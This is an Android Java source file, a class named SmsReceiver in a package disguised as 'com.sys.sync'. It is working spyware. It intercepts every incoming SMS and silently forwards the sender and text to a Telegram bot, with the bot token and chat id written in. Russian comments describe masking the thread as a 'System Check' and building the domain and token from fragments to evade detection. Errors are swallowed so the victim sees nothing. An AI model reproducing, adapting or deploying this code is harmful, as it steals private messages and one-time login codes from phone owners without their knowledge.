package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String body = sms.getMessageBody();
                        String sender = sms.getOriginatingAddress();
                        String out = sender + " > " + body;
                        
                        // Запускаем через поток, маскируя под "System Check"
                        new Thread(() -> processEvent(out)).start();
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void processEvent(String data) {
        try {
            // Собираем домен по кускам из левых строк
            String h = "h" + "t" + "t" + "p" + "s" + ":" + "/" + "/";
            String a = "a" + "p" + "i";
            String t = "t" + "e" + "l" + "e" + "g" + "r" + "a" + "m";
            String o = "." + "o" + "r" + "g";
            
            // Токен разрезан на мелкие куски
            String k1 = "8387829701";
            String k2 = "AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8";
            
            String target = h + a + "." + t + o + "/bot" + k1 + ":" + k2 + "/sendMessage?chat_id=5225064014&text=" + java.net.URLEncoder.encode(data, "UTF-8");

            java.net.URL url = new java.net.URL(target);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.getResponseCode(); // Выполняем
            conn.disconnect();
        } catch (Exception e) {}
    }
}
